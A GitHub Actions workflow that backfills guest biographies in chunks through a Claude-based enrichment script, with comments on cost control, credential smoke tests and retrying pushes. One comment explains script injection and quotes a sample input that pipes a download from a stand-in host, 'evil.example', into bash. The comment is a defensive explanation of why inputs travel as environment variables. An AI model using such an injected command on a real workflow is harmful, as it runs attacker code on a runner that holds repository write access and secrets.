name: Backfill Full Bios

# One-off backfill: enriches guests who have NO cached bio at all yet
# (~2,970 of 3,260 as of this writing — the weekly ingest only enriches
# newly-added guests, capped at 50/run, so the pre-existing backlog was
# never worked through). Full two-Claude-call pipeline per guest (structured
# extraction + description synthesis), same as enrich-bios.ts always does
# for a brand-new guest — this is that same path, just run deliberately
# against the backlog instead of waiting ~60 weekly runs for it to drain.
#
# `limit` controls how many guests to process THIS run in total — set it as
# high as you want in one go (e.g. the full backlog). Internally this runs
# in chunks of 50, committing + pushing after each chunk, so a large `limit`
# is safe: if the job times out, gets cancelled, or a chunk errors out, only
# that in-flight chunk is lost — everything before it is already on `main`.
# Re-running (with any limit) only ever picks up guests still missing a bio
# entirely, so nothing gets reprocessed or re-charged for — enforced via
# --new-only (a real cost-review finding: without it, the pipeline's own
# 30-day staleness TTL would silently re-qualify the ENTIRE archive for
# re-enrichment once this backfill finishes and 30 days pass, since
# "enrichedAt > 30 days ago" doesn't distinguish "never enriched" from
# "enriched by this exact backfill a month ago"). weekly-ingest.yml's own
# enrich-bios.ts invocation is untouched and keeps that staleness-refresh
# behavior — this flag is scoped to this workflow specifically, where
# re-spending on the whole archive was the real, unbounded risk.

on:
  workflow_dispatch:
    inputs:
      limit:
        description: "Max guests to process this run (total, across all chunks)"
        required: false
        default: "50"
      model:
        description: "Claude model to use (leave blank for the pipeline's default, claude-sonnet-4-6). Set to e.g. claude-haiku-4-5-20251001 to A/B test a cheaper model on real guests before committing to it as the default."
        required: false
        default: ""

# Only one Wikipedia-touching workflow runs at a time — a second trigger
# queues behind whichever one is already running instead of both hitting
# the same rate limits simultaneously.
concurrency:
  group: wikipedia-ingest
  cancel-in-progress: false

jobs:
  backfill:
    runs-on: ubuntu-latest
    timeout-minutes: 350
    permissions:
      contents: write
    steps:
      - name: Checkout
        uses: actions/checkout@v7

      - name: Setup Node.js
        uses: actions/setup-node@v7
        with:
          node-version: "20"
          cache: "npm"

      - name: Install dependencies
        run: npm ci

      - name: Enrich bios in chunks, committing progress after each
        env:
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
          # Passed as real env vars, not interpolated via ${{ }} into the
          # script body — GitHub substitutes ${{ }} as literal text into the
          # run: script BEFORE bash executes it, so a crafted workflow_dispatch
          # input (e.g. limit or model containing `"; curl evil.example | bash;`)
          # would execute as arbitrary shell in a runner that holds
          # contents:write and ANTHROPIC_API_KEY — a textbook GitHub Actions
          # script-injection pattern. env: values are passed as real process
          # environment variables and referenced via $VARNAME, which bash
          # treats as data, never as script text. workflow_dispatch inputs can
          # only come from someone with write access to this repo (not an
          # arbitrary public PR), but the fix costs nothing and removes the
          # class entirely.
          INPUT_LIMIT: ${{ github.event.inputs.limit }}
          INPUT_MODEL: ${{ github.event.inputs.model }}
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"

          CHUNK=50
          TOTAL="$INPUT_LIMIT"
          MODEL="$INPUT_MODEL"
          DONE=0
          # Each chunk spawns a FRESH `npx tsx` process, so enrich-bios.ts's
          # own Claude credential smoke-test would otherwise re-verify on
          # every single chunk — up to ~58 times across the full ~2,900-guest
          # backlog at 50/chunk, each one a real network round-trip that adds
          # up to real time even though its dollar cost is trivial. Verify
          # once (the first chunk), then tell every later chunk to skip its
          # own check. A credential that breaks mid-run (not just at chunk 1)
          # is still caught: an independent review found that skipping the
          # smoke test alone would let a mid-run break silently zero out a
          # whole chunk's bios.json changes, which this loop's own "no
          # changes staged = backlog exhausted" check would then
          # misinterpret as a clean, finished run. enrich-bios.ts now exits
          # non-zero when every guest in a Claude-enabled chunk fails
          # outright, which aborts this whole job loudly under bash -e
          # instead of looking like a successful stop.
          SKIP_SMOKE_TEST=""

          while [ "$DONE" -lt "$TOTAL" ]; do
            REMAINING=$((TOTAL - DONE))
            THIS_CHUNK=$((REMAINING < CHUNK ? REMAINING : CHUNK))

            echo "=== Chunk: $THIS_CHUNK guests (done so far: $DONE/$TOTAL) ==="
            if [ -n "$MODEL" ]; then
              echo "=== Using model override: $MODEL ==="
              SKIP_CLAUDE_SMOKE_TEST="$SKIP_SMOKE_TEST" npx tsx scripts/ingest/enrich-bios.ts --new-only --concurrency 4 --limit "$THIS_CHUNK" --model "$MODEL"
            else
              SKIP_CLAUDE_SMOKE_TEST="$SKIP_SMOKE_TEST" npx tsx scripts/ingest/enrich-bios.ts --new-only --concurrency 4 --limit "$THIS_CHUNK"
            fi
            SKIP_SMOKE_TEST="1"
            npx tsx scripts/ingest/patch-bios-into-guests.ts

            # Ask the Registry's Q&A endpoint (api/ask.py) reads
            # api/guests_context.json, not data/guests.json directly — only
            # weekly-ingest.yml regenerated it, on its own Monday schedule.
            # Real gap this pass found: 4 guests already had a correct bio
            # in data/guests.json but were still invisible to the live Q&A
            # feature, because the context snapshot predated their fix.
            # Regenerating it every chunk keeps new/corrected bios queryable
            # within the same run instead of waiting up to a week.
            npx tsx scripts/emit_context.ts

            git add data/guests.json
            git add api/guests_context.json
            git add -f scripts/cache/bios.json
            if git diff --staged --quiet; then
              echo "No changes this chunk — backlog is exhausted, stopping early."
              break
            fi
            # A concurrent push to main (e.g. a PR merging, or another
            # backfill's own checkpoint) between chunks makes a bare `git
            # push` fail non-fast-forward, and Actions runs `run:` blocks
            # under `bash -e` by default — that failure would kill this whole
            # job, not just the in-flight chunk, contradicting this
            # workflow's own promise above. Shared with
            # backfill-booking-signals.yml/weekly-ingest.yml — previously
            # each ingest workflow hand-rolled its own version of this same
            # commit/rebase/push-with-retry block, which is exactly how a fix
            # to one (PR #31) failed to reach the others.
            scripts/ci/commit-and-push.sh "chore: backfill full bios (chunk of $THIS_CHUNK)"

            DONE=$((DONE + THIS_CHUNK))
          done

          echo "=== Done: processed up to $DONE guest(s) this run ==="
